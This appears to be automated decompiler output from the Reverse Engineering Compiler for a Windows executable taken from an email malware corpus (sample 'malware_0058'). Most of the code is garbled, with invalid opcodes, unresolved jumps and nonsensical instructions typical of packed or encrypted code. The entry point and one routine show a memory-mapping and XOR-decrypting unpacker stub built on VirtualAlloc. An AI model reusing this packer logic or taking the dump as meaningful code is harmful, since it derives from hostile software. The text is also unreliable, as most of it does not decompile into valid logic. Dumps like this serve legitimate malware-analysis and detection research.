/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0058/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x004011E0 - 0x0040120D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011E0()
{



    bh = 106;
    asm("rep or [eax],cl");
    *ecx = *ecx ^ dl;
    edx = edx - 1;
    asm("scasb");
    asm("adc bl,[edi+0xbdf01c4c]");
    asm("scasd");
    *(esi + ebx * 8 + 134217732) = *(esi + ebx * 8 + 134217732) - dl;
    *eax = *eax + cl;
    edi = edi + 1;
    al = al + 170;
    asm("loopne 0x4011c5");
    al = al & 58;
    (restore)es;
    edi = edi - 1;
    asm("insd");
    *eax = *eax + al;
    *eax = *eax + al;
    (fsave)((frestore) + *eax) / *(eax + eax * 8 + 80);
}

/* DEST BLOCK NOT FOUND: 00401303 -> 00401334 */
stack space not deallocated on return
/*	Procedure: 0x0040120E - 0x00401313
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040120E()
{



    asm("adc dh,[edx+0x7cf498]");
    *eax = *eax + al;
    esi = esi - 1;
    asm("adc bh,[edx+0xe0003ed2]");
    (restore)edi;
    (restore)ebx;
    asm("outsb");
    if(!(al = al & 147)) {
    }
    *eax = *eax + al;
    *eax = *eax + al;
    asm("loop 0x40122a");
    asm("insb");
    asm("adc dword [ebp+0x42c7e],+0x0");
    *edi = eax;
    edi = edi + 4;
    (save)ss;
    asm("xchg eax,edx");
    ebx = ebx + edx;
    asm("aam 0xf5");
    *eax = *eax + al;
    asm("adc byte [eax-0x5d],0xc0");
    asm("clc");
    asm("scasd");
    *esi = *esi - edx;
    ebx = ebx | *(esi + -1036776049);
    *eax = *eax + al;
    *eax = *eax + al;
    *(eax - 14) = *(eax - 14) + bl;
    *(ebx + 81) = *(ebx + 81) & al;
    asm("cli");
    (restore)ebp;
    *eax = *eax + ah;
    *(edx - 14) = *(edx - 14) | bh;
    *(ebx + esi * 4) = *(ebx + esi * 4) + ch;
    asm("loop 0x4011f1");
    esp = esp + 1;
    asm("rcl dword [ebp+0x5319d7],1");
    asm("adc [esi+0x815d0897],dl");
    if(!( *(eax + 16) = *(eax + 16) + al)) {
    }
    *(ebx + edx * 4 + -1935482610) = *(ebx + edx * 4 + -1935482610) + dl;
    asm("adc [edx+0x800ac],bl");
    asm("sbb byte [eax],0xe4");
    asm("fidivr dword [eax-0x6a]");
    *(eax + eax) = *(eax + eax) ^ al;
    *edx = *edx + dh;
    *(edi + 1755372831) :: ah;
    return;
    (save)cs;
    dh = dh - dl;
    *%cs:eax] = *%cs:eax] | al;
    *eax = *eax + al;
    *(eax + eax * 2 + 106) = *(eax + eax * 2 + 106) + bl;
    asm("out 0xb,al");
    asm("sti");
    asm("outsd");
    edx = edx - *eax;
    *eax = *eax + al;
    (restore)ebp;
    *(eax - 45) :: 221;
    al = al | 137;
    dh = dh + dl;
    eax = eax - 13419840;
    *eax = *eax + al;
    *eax = *eax + al;
    edi = edi + 1;
    asm("%g pop esi");
    *edi = *esi;
    edi = edi + 1;
    if(!(esi = esi + 1)) {
        *(edi + 230) = *(edi + 230) ^ ebp;
        asm("xchg eax,ebp");
        asm("xchg eax,edx");
        < ? L00401247 : ;
        asm("Unknown opcode 0xfe");
        (save)ebp;
        asm("jpo 0x4012cb");
        *(esi - 81) = *(esi - 81) + ch;
        *L2AEA8619 :: bh;
        (restore)esi;
        *eax = *eax + al;
        *eax = *eax + al;
        asm("sbb ecx,[eax]");
    }
    asm("ror cl,0xed");
    (restore)ebx;
    asm("Unknown opcode 0x82");
    (fsave)(frestore) + st4;
    asm("int3");
    *eax = *eax + al;
    *eax = *eax + al;
    *(ebx + -1953803172) = *(ebx + -1953803172) + al;
    cl = cl + *(bl + ch + -2142154033);
    asm("rep push ebx");
    al = al | 136;
    asm("out 0xf5,eax");
    asm("fisubr dword [edi]");
    asm("sbb [eax+edx-0x70],ebx");
    al = al | 12;
    asm("jpo 0x401334");
    asm("sbb [eax+0x10],edx");
    al = al | 26;
    asm("adc eax,0x100c192f");
    al = al | 197;
    < ? L004012a0 : ;
}

/*	Procedure: 0x00401314 - 0x00401363
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)0;
    (save)16384;
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    eax = *__imp__CreateFileMappingA();
    if(eax != 0) {
        (save)eax;
        eax = *__imp__GetCurrentProcessId();
        (restore)eax;
        (save)0;
        (save)0;
        (save)0;
        (save)6;
        (save)eax;
        *__imp__MapViewOfFile();
        if(eax != 0) {
            return(L00401364(eax));
            (restore)eax;
            L00401A98();
            eax = 0;
        }
    }
}

/*	Procedure: 0x00401364 - 0x004013DC
 *	Argument size: -24
 *	Local size: 28
 *	Save regs size: 0
 */

L00401364(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    *__imp__VirtualQuery(A8, esp, 28);
    eax = Vfffffffc >> 12;
    ecx = eax - 1;
    *(esp + eax) = *(esp + eax) + eax;
L00401386:
    return;
    (save)edx;
    asm("Unknown opcode 0x8e");
    *__imp__HeapFree();
    *ebx = cl;
    asm("das");
    asm("sbb [eax+edx-0x70],ecx");
    al = al | 3;
    asm("das");
    asm("sbb [eax],esi");
    asm("adc [eax+0x8235a80c],dl");
    asm("aas");
    bl = bl >> cl;
    asm("rcl byte [esi-0x3d],cl");
    asm("mul dword [ecx]");
    if(edi = edi + 1) {
        goto L00401386;
    }
    esp = esp - 1;
    asm("imul ecx");
    edi :: edi;
    L00000c90();
    asm("clc");
    asm("std");
    asm("das");
    asm("sbb [eax+edx-0x70],edx");
    al = al | 162;
    (save)esi;
    bl = bl ^ 82;
    al = al + 19;
    esi = esi + *(edi + -508108847);
    (restore)ds;
    asm("Unknown opcode 0xdf");
    esi = esi - 1;
    asm("retf 0x5b51");
}

stack space not deallocated on return
/*	Procedure: 0x004013DD - 0x00401663
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013DD()
{
	/* unknown */ void  Vffffffcc;



    (restore)edi;
    ebx :: *(ebp + 422519354);
    eax = (al | 235) - 1;
    asm("adc [eax+0x8a51600c],dl");
    (restore)esi;
    *ebx = *ebx - bh;
    asm("sbb eax,0x14d2748d");
    eax = *(eax + -118586614) & 65535;
    esi = esi - 1;
    eax = *(eax - 128);
    asm("out 0x14,eax");
    edx = edx - 1;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("adc eax,0x87db8bc3");
    asm("jpo 0x401418");
    (restore)ebx;
    ebp = ebp - 1;
    al :: 3;
    asm("adc [ebx],eax");
    bh = 80;
    asm("Unknown opcode 0xc4");
    asm("out 0xdb,eax");
    (save)edx;
    (save)14;
    *eax = *eax + al;
    bh = bh << 1;
    (save)es;
    (save)edx;
    *(ecx + -1647312895) :: al;
    eax = L003342e8();
    goto L0040149c;
    edx = 422553285;
    asm("insb");
    asm("adc [eax+0xfb1fc50c],dl");
    asm("les esi,[ebp+0x1d]");
    edi :: *(ecx + ecx * 4);
    edx = edx + 1;
    asm("aam 0x85");
    edx = edx + 1;
    *ebx = *ebx | bh;
    al = al + *ecx;
    edx = edx + 1;
    asm("lock jmp short 0x401488");
    (restore)edi;
    esp = esp - -60;
    asm("lock jmp short 0x401473");
    eax = -1280734898;
    eax = L004ceadc(esp);
    (save)eax;
    *LEFD00002 :: dl;
    (restore)es;
    edx = edx - *(edx + 1005417988);
    asm("aam 0x83");
    asm("Unknown opcode 0xc4");
    asm("enter 0xc357,0x33");
    asm("adc [edi+0x1206af92],dh");
    edx = esp;
    ecx :: esp;
    al = al - 69;
    asm("das");
    asm("sbb [eax],edx");
    asm("adc [eax+0x88e5590c],dl");
    asm("iret");
    (save)ecx;
    (save)-48;
    asm("xchg edx,[ebx+0xc]");
    bl = bl ^ 18;
    goto L004014b8;
    asm("o16 add [ebx+edi-0x4],dl");
    ecx = ecx + ecx;
L0040149c:
    asm("das");
    asm("sbb [eax+edx],ebx");
    al = al | 21;
    al = *esi;
    for(esi = esi + 1; 1; asm("jecxz 0x4014b5");) {
        (save)ebx;
        asm("out 0x1,al");
        *edi = eax;
        edi = edi + 4;
        (save)ebp;
        (fsave)(frestore) * *edi / *(ebp + 54);
        ebx :: *(esi - 85);
        eax = 3229;
        3229 :: *L9E6BFE8B;
L004014b8:
        asm("scasd");
        asm("salc");
L004014bc:
        asm("into");
        asm("out 0x9,eax");
        edx = edx - 1;
        asm("sti");
        asm("les ebp,[ecx]");
        esp = esp - 1;
        asm("hlt");
        al = al - 235;
        asm("sbb ch,[ecx+0x6d]");
        al = 24;
        asm("lock int 0xea");
        dl = dl + *(ebx + 72);
        al = al & 32;
        asm("aam 0xb4");
        *eax = *eax + al;
        asm("%c jnc 0x401466");
        al = dh;
        asm("sldt [eax]");
        ecx :: *edx;
        eax = *edi;
    }
    asm("rol dword [ebx+ecx*4],cl");
    (restore)es;
    asm("fbstp tword [edx+0xe71333c9]");
    eax = eax + -337880224;
    *edi = *L4D34CDE3;
    edi = edi + 4;
    esi = 1295306215;
    asm("fucomi st3");
    asm("scasb");
    cl = 207;
    eax = eax - 1478045631;
    asm("adc [eax+0xd31f440c],dl");
    asm("jpo 0x40152b");
    esp = esp + *ebx;
    asm("out 0x57,eax");
    asm("xchg eax,ecx");
    eax :: *edi;
L00401516:
    esi = esi - ebx;
    ebx :: *(edx - 117);
    asm("jpe 0x4014c5");
L0040151d:
    asm("Unknown opcode 0x0f");
    asm("sti");
    goto L0040151d;
L00401521:
    Vffffffcc & eax;
    asm("insd");
    return;
    if(edx >= *edx) {
        goto L00401516;
    }
    goto L004014bc;
    asm("int 0xe9");
    asm("adc [ebx],dh");
    edi = edi + 1;
    ecx = *(edi - 56);
    asm("xchg esi,[edi+0x20]");
    ebp :: *eax;
    ecx = *edx;
    asm("pmagw mm7,[ebx+edi]");
    asm("aam 0x33");
L00401542:
    esp = ebp;
    (restore)ebp;
    bh :: al;
    asm("rcl byte [ebp+0x5e],1");
    goto L00401557;
    (restore)ebx;
    (save) *(edx - 84);
    asm("xchg esi,eax");
    goto L00401542;
L00401555:
    (save)ebx;
    edi = edi - eax;
L00401557:
    esp :: *(ebx + eax);
    asm("rep inc edx");
    eax = *L0FE48D56;
    if(*(esi - 46) >= dl) {
        goto L00401557;
    }
    (save)ecx;
    edx :: esp;
    asm("lodsd");
    edx = edx + *ebx;
    (save)ebp;
    goto L00401555;
    asm("sti");
    asm("jpo 0x401593");
    *esi = *esi >> 1;
    asm("emms");
    al = al & 223;
    ebx = -852610188;
    asm("out 0x2,al");
    if(eax > *(esi + -170680969)) {
        goto L00401521;
    }
    asm("jecxz 0x401556");
    goto L00401521;
    al = al ^ bl;
    (restore)edi;
    (restore)edi;
    ecx :: *(ebp + -409024373);
    asm("xchg eax,esi");
    ebx = 276306223;
    if(!(al = al | 253)) {
        *eax = *eax | al;
        al = al + dl;
        *edi = *esi;
        edi = edi + 4;
        esi = esi + 4;
        *eax = *eax + al;
        asm("ror byte [edi+ecx+0x4e870145],1");
        al = al | 59;
        asm("adc cl,[ebx+0x29f446]");
        al = al + dl;
        al = *esi;
        esi = esi + 1;
        goto L004015e2;
        (save)14;
        *eax = *eax + al;
        asm("Unknown opcode 0xd0");
        ch = 32;
        al = (al + dl | 169) + dl | 32;
        asm("Unknown opcode 0x0f");
        asm("xchg eax,ebp");
        asm("fucomp st3");
        asm("rcr byte [ebx+0x4a],1");
        *ebx = *ebx | al;
        asm("Unknown opcode 0xdb");
        asm("Unknown opcode 0x0f");
        asm("xchg eax,esp");
        edx = edx - 1;
        asm("adc al,ch");
        (fsave)(frestore) * *eax;
        *eax = *eax + al;
        eax :: *edx;
L004015e2:
        edx = 839744;
        eax :: -1610609456;
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        bl = 235;
        asm("int3");
        asm("adc eax,[ebx]");
L004015f2:
        asm("lodsd");
        ah = 47;
        asm("sbb [eax],ebx");
        asm("adc [eax+0x38a88d0c],dl");
        eax :: *edx;
        al = al + dl;
        (restore)ebp;
        ecx = eax;
        (save)ebp;
        asm("lds esi,[ebp+0x15]");
        ebx :: *L5CC4718B;
    }
L0040160a:
    (save)ecx;
    ebx = edx;
    edi = edi + 1;
    bl = bl | ch;
    asm("rcl byte [ebx+eax+0x73],0xd4");
    asm("out 0x28,eax");
    goto L004015f2;
    asm("int 0xe9");
    ah = ah + *ebx;
    eax & -2014844071;
    asm("Unknown opcode 0xc6");
    eax = eax ^ *edx;
    asm("xchg ecx,[ecx+0x3c]");
    asm("daa");
    asm("std");
    *ecx = *ecx * edx;
    asm("out 0xa,eax");
L00401633:
    asm("rep jpo 0x40168b");
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    ebp = ebp - 1;
    asm("adc bl,ch");
    asm("outsd");
    (save)esi;
    esi = eax;
    edi = esp;
    asm("ror byte [ebx+0x3b0300a9],cl");
    asm("xchg bl,[ebx+0x51]");
    edx = *(ecx + -745019388);
    ebx = *eax;
    asm("int 0xe9");
    ah = ah + bl;
    asm("int3");
    goto L00401633;
    (save)ebx;
    asm("int 0x28");
    if(ebx >= *edx) {
        goto L0040160a;
    }
}

/* DEST BLOCK NOT FOUND: 004017f3 -> 9155ffca */
stack space not deallocated on return
/*	Procedure: 0x00401664 - 0x00401A97
 *	Argument size: 3554
 *	Local size: 0
 *	Save regs size: 0
 */

L00401664(A8)
/* unknown */ void  A8;
{



    asm("das");
    asm("sbb [eax],eax");
    asm("adc [eax+0xe36f780c],dl");
    asm("fidivr word [ecx+0x1eda7f98]");
    ebx = ebx ^ *ebx;
    asm("sti");
    asm("int1");
    eax = 517382980;
    517382980 :: *ebx;
    (save)edx;
    (save)ecx;
    esp :: esi;
    ecx = ecx - 517382980;
    *LE3C10308 = 517382980;
    asm("lds edx,[ecx-0x15]");
    *edi = *edi >> 195;
    edx = edx + *edx;
    (save)ebp;
    goto L004016b7;
    dl = *(ebp - 61);
    ebx = ebx ^ *ebx;
    asm("xchg eax,[edx+0x4]");
    eax :: *edi;
    ecx = eax;
    ebp = ebp & *(eax + -629164103);
    (save)ds;
    goto L004016c4;
    (restore)esi;
    asm("mul ecx");
    1070519983 = edx * edi;
    asm("retf");
    asm("mul dword [ecx]");
    asm("out 0xdd,eax");
L004016b7:
    (restore)edx;
    asm("ror dword [esi+0x4],1");
    goto L004016d2;
    al = al ^ 96;
    asm("%e das");
    asm("sbb [eax+edx-0x70],eax");
L004016c4:
    al = al | 137;
    (save)cs;
    asm("das");
    asm("sbb [eax+edx-0x70],esp");
    eax = (al | 33) + 1;
    al = 135;
L004016d2:
    asm("les eax,[ebx+0xdc8b203c]");
    edx = -754062580;
    asm("jpe 0x40171b");
    *(ebx + -763500540) = esp;
    goto L004016c4;
    *(ebx + 16) & eax;
    (restore)ebp;
    edi = edi - 1;
    asm("adc al,0x89");
    asm("xchg eax,ebx");
    bl = bl + ch;
    (restore)ss;
    bl :: dl;
    *eax = *eax + al;
    asm("ror byte [edi+0xe7b12cc4],1");
    asm("adc eax,ebp");
    cl = *(eax + eax);
    *eax = *eax + bh;
    esp = esp + 1;
    bh = bh << 1;
    asm("ror dword [ecx+0xefeb9cc3],1");
    asm("adc esi,[edi+0x192f7013]");
    if(!( *eax = *eax + eax)) {
        if(al = al | 148) {
            goto L00401755;
        }
        asm("adc eax,0x852ffffe");
        ebx = ebx + 1;
        eax = (al | 59) & -614632776;
    }
    L00400a0a(ss);
    edi = edi - 1;
    *(eax + -131522910) = *(eax + -131522910) | bh;
    ebp :: esi;
    ecx = ecx & -62256;
    dh = 141;
    if(*(ebp - 118) < ecx) {
        *ecx :: -805240820;
        asm("out 0x15,eax");
        eax = 710562210;
        ch :: ch;
L00401755:
        asm("std");
        goto ( *edi);
        *(ebx + 16) & eax;
        ecx = edi;
        (save)ebx;
        ecx = *(ebx + 1003940608);
        asm("salc");
    }
    edx = ecx;
    (save)930399341;
    asm("in al,0xc8");
    asm("std");
    asm("das");
    asm("rep mov [ebx],eax");
    (save)-1608249992;
    asm("in al,0xbc");
    asm("std");
    asm("das");
    asm("rep mov [ebx-0x2c],eax");
    asm("out 0xa3,eax");
    esi = esi + 1;
    asm("das");
    asm("sbb [eax],edi");
    asm("adc [eax+0x2f580d0c],dl");
    asm("sbb [eax+edx],eax");
    al = al | 128;
    goto L9155ffca;
    eax = eax << *(eax - 20);
    asm("xchg eax,[eax+0x28]");
    asm("ror dword [edi],cl");
    goto L004017b1;
    6737920 = *(eax + eax) * ebp;
    asm("loop 0x4017d5");
    asm("Unknown opcode 0x8d");
    asm("les eax,[eax+0xeb000cd0]");
    (fsave) *(edi + 1213796451);
L004017b1:
    al = al & 32;
    cl = 135;
    L002e5317();
    asm("loopne 0x4017f0");
    asm("sbb [eax+edx],esi");
    (al | 164) :: 233016;
    ah = (al | 164) << 1;
L004017cd:
    eax = eax ^ -1863110660;
    edx = *(ebx + 1529539336);
    edi = edi + 1;
    *(ebx + 256968867) = *(ebx + 256968867) | cl;
    asm("a16 dec ebp");
    asm("adc al,0x8b");
    goto L004017cd;
    edx = *%ds:ecx];
    asm("in al,0xfc");
    al = eax + edx | 139;
    asm("enter 0xcce3,0xc1");
    goto L9155ffca;
    (restore)ebx;
    cl = cl + 1;
    asm("out 0xd3,al");
    asm("int 0xe2");
    eax = eax + 434641467;
    asm("ror dword [eax+eax],cl");
    L00400b64();
    esp = esp & *(edi + 1433727841);
L00401811:
    eax = *(ecx + 1574955786);
    asm("sbb [edx],dh");
    eax = eax + *ecx;
    asm("in al,0xe8");
    asm("std");
    asm("das");
    asm("rep nop");
    goto L00401898;
    *(ecx + eax - 56) = *(ecx + eax - 56) + -1336653433;
L00401829:
    asm("out 0xb8,eax");
    asm("Unknown opcode 0xdd");
    asm("das");
    asm("sbb [eax],esp");
    asm("adc [eax+0x8130370c],dl");
    asm("xchg ecx,[ebx+0x8]");
    (restore)ebx;
    ebp = ebp + 1;
    al :: 232;
    ah = 247;
    asm("Unknown opcode 0xff");
    *(ecx + 1204449231) = *(ecx + 1204449231) - 1;
    asm("in al,0x43");
    al = eax + edx | 80;
    goto L00401811;
    dl = dl | 41;
    al = 233;
    asm("ror byte [%ds:eax+eax],1");
    goto L00401898;
    esi = ebx;
    goto L00401898;
    *(ebx + 4) & esi;
    edi = edi + 1;
L00401865:
    asm("in al,0xb6");
    dl = dl + al;
    al = al | 88;
    eax = L004008c3();
    ebx :: *eax;
L00401872:
    return;
    (save)eax;
    *(ecx + eax) :: dh;
    al = al + dl;
    ah = 4;
    asm("adc al,0xd0");
    al = al | 80;
    eax = L00402549();
    ebx :: ebx;
    asm("Unknown opcode 0xc6");
    asm("salc");
    ecx = ecx + 1;
    goto L00401872;
    asm("das");
    asm("sbb [eax+edx],esp");
    al = al | 195;
    *(ecx + 602653468) = *(ecx + 602653468) + 1;
L00401898:
    ax = ax + 1;
    (save)15568;
    *(edi + 213519435) = *(edi + 213519435) + 235;
    goto L00401829;
L004018a9:
    al & 179;
    bh = bh + *eax;
L004018ac:
    *(edi + 1 - 10) = *(edi + 1 - 10) >> 1;
    goto L00401865;
    if(!( *eax = *eax + eax)) {
        edx = edx ^ *eax;
        asm("in al,0x3e");
        al = eax + edx | 115;
        asm("%s push ebx");
        asm("int 0x1");
        al = 192;
        *L000000C0 = *L000000C0 + 192;
        esp :: *L0DE0E802;
        goto L00401911;
        *ebx :: ah;
        *eax = *eax ^ eax;
L004018d6:
        if(al = al + dl) {
            goto L004018a9;
        }
        eax = (al | 115) ^ -351932336;
        asm("stc");
        asm("cmpsb");
        goto L004018ac;
    }
    *edi :: ah;
    asm("daa");
    asm("retf");
    if(!(al = al + dl)) {
        asm("aas");
L004018ee:
        (restore)ebp;
        L004025A4();
        edi :: *edi;
        al = *esi;
        goto L004018ee;
        (save)ds;
        asm("Unknown opcode 0xc0");
        if(!(esi = esi + 1)) {
            >= ? 0x401901 : ;
            goto L00401931;
            asm("in al,0xbf");
            al = eax + edx | 235;
            *edi = *esi;
            edi = edi + 1;
            edi = ecx;
            if(!(esi = esi + 1)) {
                (save)ebx;
                asm("hlt");
                > ? L00401987 : ;
                asm("lds ecx,[ebp+0x41]");
L00401911:
            }
            goto L004018d6;
            asm("aas");
            (restore)ebp;
        }
        eax = L0040254C();
        ebx :: *(ebx + -358291247);
    }
    asm("adc ecx,ecx");
    esp :: *(ecx + ecx * 4 + 1347744772);
    bl = 209;
    asm("out 0xd2,eax");
    asm("in eax,dx");
    bl = bl ^ 19;
L00401931:
    (restore)ebx;
    ecx :: *edx;
    (save)ebx;
    ecx = *(ebx + 334818048);
    asm("rep adc eax,0x4cc028");
    return;
    ecx = ecx + 1;
    esp = esp + 1;
    eax = eax << 216;
    al = *L0F38C933;
    *eax = *eax + al;
    asm("ror bh,1");
    asm("arpl cx,bp");
    asm("xchg eax,ecx");
    asm("in al,0xa2");
    al = al + dl;
    al = al | 19;
    esp = ebp;
    (restore)ebp;
    *(edi + 2127560704) :: dl;
    asm("repne ret");
    (save)ebx;
    (save)135;
    edx = ebx;
    dh = 64;
    al = 239;
    if(!( *(ebx + 70) = *(ebx + 70) | bl)) {
        asm("rep jmp [ecx+0x13]");
        edx = edx - 1;
        asm("iret");
        (save)-1007187023;
        asm("jecxz 0x401959");
        eax = L003348a8();
        ebp = ebp - esp;
        *(eax - 119) = *(eax - 119) - bl;
        al = *esi;
        esi = esi + 1;
        *(ebx + ebp * 8) = *(ebx + ebp * 8) - bl;
L0040198e:
        ebp :: *(edi + edx * 2 - 4);
        asm("bound ecx,[ebx+ebp*8+0x25369e8]");
        al = al + dl;
        asm("xchg edi,eax");
    }
    edx :: *LE1296C22;
L004019a6:
    asm("jecxz 0x4019be");
    edi = edi >> cl;
    eax = L0033444d();
    goto L0040198e;
    asm("xchg ecx,[ebx]");
    (save)ebx;
    al = al - 183;
    asm("xchg eax,edx");
    asm("scasd");
    (save)es;
    asm("adc al,[ebx]");
    asm("fnstcw [ebx]");
    asm("salc");
    (restore)ebx;
    return;
    ecx = ecx ^ *ebx;
    esi = esi + ebx;
    *(eax + -1305477126) :: cl;
    (save)cs;
    asm("insb");
    asm("stc");
    asm("in eax,dx");
    ecx = 839713;
L004019cf:
    esp = esp + *ebx;
    asm("out dx,eax");
    eax = eax + -613912;
    goto ( *(ecx + 83));
L004019de:
    asm("Unknown opcode 0xd0");
    dl = 110;
    if(eax = eax | *eax) {
        goto L004019de;
    }
    asm("in eax,dx");
    goto L004019a6;
    asm("adc ecx,edi");
    (save)ecx;
    ebx = *(ebx + -397833468);
    asm("in al,0xb2");
    asm("stc");
    asm("das");
    asm("rep pop ecx");
    goto L00401a39;
    if(bh = bh - al) {
        goto L004019cf;
    }
    (fsave)(frestore) / *(ebp + 5);
    (restore)edx;
    asm("sbb al,[esi+0x12]");
L00401a05:
    asm("scasd");
    if(!(cl = cl + bh)) {
L00401a08:
        eax = (eax & 698663044) << 1;
        *L8619EB11 = eax;
        (restore)esi;
        (save)ebx;
        asm("iret");
        return;
        ecx = 3288;
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        asm("in al,0xeb");
        asm("sbb eax,0x8a46025b");
        asm("adc [ecx+0x3f3eebdb],ecx");
        return;
        asm("out 0xf1,eax");
        cl = 199;
        asm("fucom st0");
        goto L00401a05;
L00401a39:
        edx = edi;
        (restore)esi;
        (restore)edx;
        edx = edx - 1;
        ch = ch + bl;
        *(edi + 117) = *(edi + 117) | al;
        asm("retf 0xcf5a");
    }
    goto L00401a08;
    (restore)ebx;
    asm("aad 0xba");
    asm("Unknown opcode 0xc1");
    edx = edx ^ *eax;
    asm("xchg ecx,eax");
    goto L00401a74;
    if(!( *(edi + 17) = *(edi + 17) + ah)) {
        edx = edx ^ *edx;
    }
    asm("out dx,al");
    asm("Unknown opcode 0xda");
    goto L00401a69;
    asm("popf");
    asm("adc dl,[edi+edi*8-0x2f]");
L00401a60:
    A8 = eax;
    ecx = edi;
    ebx = 3280;
L00401a69:
    edi = eax;
    goto L00401aaf;
    asm("popa");
    edx = 184;
L00401a74:
    ebp = ebp + edx;
    (save)816;
    goto L00401a8e;
    (save)64;
    (save)12288;
    ebp = ecx;
    (save)edi;
    (save)0;
    goto L00401a60;
L00401a8e:
    *esp = *esp + ebp;
    edx = 4194304;
    goto L00401ab6;
}

/* DEST BLOCK NOT FOUND: 00401aad -> 00401a80 */
/* DEST BLOCK NOT FOUND: 00401ac2 -> 00401a71 */
/*	Procedure: 0x00401A98 - 0x00401AF6
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401A98(A18)
/* unknown */ void  A18;
{



    asm("pusha");
    edi = 2232;
    esi = 0x4012e8;
    A18 = __imp__VirtualAlloc;
    goto L00401a80;
    ecx = (ecx >> 2) + 1;
    asm("lodsd");
    goto L00401ab7;
    return;
L00401ab7:
    *edi = eax ^ ebx;
    edi = edi + 4;
    asm("loop 0x401ab3");
    ecx = __imp__VirtualFree;
    goto L00401a71;
    asm("adc ebx,[edx-0x75]");
    edx = ebx / ebx % ebx / ebx;
    asm("cld");
    asm("rep movsb");
    fs = edi;
    asm("cmc");
    asm("sbb ecx,[edx+0xf874d289]");
    ah = 152;
    asm("scasd");
    (save)es;
    asm("adc ch,bl");
    asm("ror byte [ebx+ebp*8],1");
    asm("in al,dx");
    *edi = ebp;
    asm("rcr dword [ecx-0x75],0xe7");
    ch = ch ^ *(eax + 47);
    if(!( *%fs:eax] = *%fs:eax] + (al & 130))) {
    }
    *(eax + -222798655) = *(eax + -222798655) + bh;
    asm("aas");
    asm("retf");
}

/* DEST BLOCK NOT FOUND: 00401b7f -> 00401be8 */
stack space not deallocated on return
/*	Procedure: 0x00401AF7 - 0x00401BC0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401AF7()
{



    asm("movq mm5,mm1");
    goto L00401b06;
    asm("adc ebx,[edi-0x15]");
    asm("adc bl,dl");
    asm("into");
    eax = eax - 1;
    (restore)edx;
    edi :: edx;
L00401b06:
    (restore)ecx;
    ebx = ebx ^ *ebx;
    asm("xadd ecx,eax");
    *(ebx + ebp * 8) :: bl;
    asm("aam 0x81");
    bh = 146;
    asm("scasd");
    (save)es;
    asm("adc bh,[ecx+0x1ec3199f]");
    goto L00401b3b;
    (save)esi;
    return;
    asm("%f mov eax,0xd000800c");
    asm("o16 add [ebx+0xff500083],cl");
    asm("Unknown opcode 0x82");
    al = al + 195;
    ebp = ebp + 1;
    asm("adc [eax-0x30],al");
    asm("iret");
    asm("adc [esp+0x53330340],al");
L00401b3b:
    if(!(esp = esp - 1)) {
        if(*(ebx + 15) = *(ebx + 15) + bl) {
            goto L00401b86;
        }
        ecx :: *(ebp - 85);
        if(edi = edi - 12) {
            goto L00401b95;
        }
        fs = edi;
        cl = cl ^ *(ebx + 1014370275);
    }
    (restore)ebx;
    asm("Unknown opcode 0x82");
    *eax & al;
    asm("ror byte [ebx+ecx*4],1");
    dh = 80;
    *ebx = *ebx + bh;
    asm("adc eax,0xe7eb0356");
    eax = eax - 35488909;
    *ecx = !( *ecx);
    *(eax + 3) = *(eax + 3) + dl;
    esp = esp + 1;
    asm("retf 0x5438");
    asm("clc");
    goto ( *edi);
    asm("out 0xcb,eax");
    asm("jecxz 0x401b56");
    goto L00401be8;
    (restore)esi;
    asm("adc al,0x3b");
    edx = 9831363;
L00401b86:
    L00334936();
    ebp = *(esi + 1187965724);
L00401b95:
    asm("xchg edx,[ebx]");
    ebx = edi;
    asm("xchg eax,esi");
    goto L00401bb7;
    eax = eax - -710825277;
    (restore)ecx;
    asm("wait");
    (restore)es;
    asm("adc dl,[ecx+0x60942ae2]");
    asm("daa");
    asm("fdivrp st5");
    ebp = ebp - 1;
    *eax = *eax + al;
    al = al + *eax + cl;
    asm("pusha");
    (save)ss;
L00401bb7:
    (fsave)(frestore) + *(esi - 8);
    eax = eax + -1610612733;
    (save)-1610612706;
}

/*	Procedure: 0x00402549 - 0x0040254B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402549()
{



}

/*	Procedure: 0x0040254C - 0x004025A3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040254C()
{



}

/*	Procedure: 0x004025A4 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004025A4()
{



}

/* address  size  */
/* 0x004000a3       0 */ /* unknown */ void 	__imp__µ«›;
/* 0x00401000       0 */ /* unknown */ void 	__imp__HeapWalk;
/* 0x00401004       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x00401008       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00401010       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401014       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00401018       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__CallNamedPipeA;
/* 0x00401020       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x00401024       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x00401028       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x0040102c       0 */ /* unknown */ void 	__imp__CreateFileMappingA;
/* 0x00401030       0 */ /* unknown */ void 	__imp__SetNamedPipeHandleState;
/* 0x00401034       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x00401038       0 */ /* unknown */ void 	__imp__SetCurrentDirectoryA;
